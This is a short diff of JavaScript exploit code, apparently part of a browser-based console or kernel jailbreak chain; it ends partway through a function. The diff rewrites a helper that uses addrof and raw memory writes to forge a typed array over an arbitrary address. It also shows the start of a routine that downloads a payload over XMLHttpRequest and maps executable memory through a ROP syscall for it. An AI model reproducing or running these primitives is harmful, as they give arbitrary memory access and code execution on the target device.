@@ -1810,13 +1810,19 @@ kexploit().then(() => {
 
        
 function array_from_address(addr, size) {
-    var og_array = new Uint32Array(0x1000);
-    var og_array_i = mem.addrof(og_array).add(0x10);
-    mem.writep(og_array_i, addr);
-    mem.write4(og_array_i.add(0x8), size);
-    mem.write4(og_array_i.add(0xC), 0x1);
-    nogc.push(og_array);
-    return og_array;
+
+var og_array = new Uint32Array(0x1000);
+var og_array_i = mem.addrof(og_array).add(0x10);
+
+
+mem.write64(og_array_i, addr);
+
+mem.write32(og_array_i.add(0x8), size);
+
+mem.write32(og_array_i.add(0xC), 0x1);
+
+nogc.push(og_array);
+return og_array;
 }
     
 var req = new XMLHttpRequest();
@@ -1826,8 +1832,7 @@ var req = new XMLHttpRequest();
  req.onreadystatechange = function () {
   if (req.readyState == 4) {
    var PLD = req.response;
-     var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-
+  var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
    var pl = array_from_address(payload_buffer, PLD.byteLength*4);
    var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
    var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
